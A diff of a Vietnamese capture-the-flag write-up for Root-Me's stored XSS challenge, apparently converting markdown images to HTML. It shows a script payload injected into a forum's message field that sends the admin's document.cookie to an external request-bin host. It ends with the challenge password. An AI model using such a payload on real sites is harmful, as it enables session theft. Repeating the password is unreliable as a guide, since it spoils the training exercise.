@@ -1,33 +1,33 @@
 # WRITE UP
 
-## **Challenge: [XSS -- Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)**
+## **Challenge: [XSS – Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)**
 
 Challenge yêu cầu ta thực hiện đánh cắp cookie phiên quản trị viên và cung cấp cho ta một website để đăng post:
 
-![Graphical user interface, text, application, email Description automatically generated](./media/image1.png){width="4.271972878390201in" height="3.1117574365704286in"}
+<img src="./media/image1.png" style="width:4.27197in;height:3.11176in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
-Kiểm tra source thì thấy đây là một form với phương thức "POST". Như tên đề bài, ta sẽ thực hiện XSS Stored vào input. Nhưng trước hết ta kiểm tra xem nó bị XSS ở đâu, ta được kết quả là nó bị tại ô input 'Message':
+Kiểm tra source thì thấy đây là một form với phương thức “POST”. Như tên đề bài, ta sẽ thực hiện XSS Stored vào input. Nhưng trước hết ta kiểm tra xem nó bị XSS ở đâu, ta được kết quả là nó bị tại ô input ‘Message’:
 
-![Graphical user interface, text, application, email Description automatically generated](./media/image2.png){width="4.170361986001749in" height="2.3788156167979in"}
+<img src="./media/image2.png" style="width:4.17036in;height:2.37882in" alt="Graphical user interface, text, application, email Description automatically generated" />
 
-![Text Description automatically generated](./media/image3.png){width="6.5in" height="1.0951388888888889in"}
+<img src="./media/image3.png" style="width:6.5in;height:1.09514in" alt="Text Description automatically generated" />
 
 Đầu tiên, ta thực hiện tạo một nơi để có thể thu thập các HTTP Request với <https://requestbin.in>:
 
-![Graphical user interface, application Description automatically generated](./media/image4.png){width="6.5in" height="2.2159722222222222in"}
+<img src="./media/image4.png" style="width:6.5in;height:2.21597in" alt="Graphical user interface, application Description automatically generated" />
 
 Như vậy, ta có một requestbin tại <https://eojx5xx99skfihj.m.pipedream.net>:
 
 Tiếp theo, ta có thể đoán được chắc chắn Forum v0.001 website này bị XSS, do vậy, ta thực hiện viết payload để attack vào input của form này:
 
-Payload: \<script\>document.write(\"\<img src=\'https://eojx5xx99skfihj.m.pipedream.net/\"+document.cookie+\"\'\>\</img\>\");\</script\>
+Payload: &lt;script&gt;document.write("&lt;img src='https://eojx5xx99skfihj.m.pipedream.net/"+document.cookie+"'&gt;&lt;/img&gt;");&lt;/script&gt;
 
-![](./media/image5.png){width="5.567148950131234in" height="2.6252274715660544in"}
+<img src="./media/image5.png" style="width:5.56715in;height:2.62523in" />
 
-![Graphical user interface, text, application Description automatically generated](./media/image6.png){width="6.033856080489938in" height="1.2501082677165354in"}
+<img src="./media/image6.png" style="width:6.03386in;height:1.25011in" alt="Graphical user interface, text, application Description automatically generated" />
 
-Kiểm tra request bin, ta nhận được giá trị ADMIN_COOKIE.
+Kiểm tra request bin, ta nhận được giá trị ADMIN\_COOKIE.
 
-![A picture containing graphical user interface Description automatically generated](./media/image7.png){width="6.5in" height="1.2125in"}
+<img src="./media/image7.png" style="width:6.5in;height:1.2125in" alt="A picture containing graphical user interface Description automatically generated" />
 
 **Password:** NkI9qe4cdLIO2P7MIsWS8ofD6
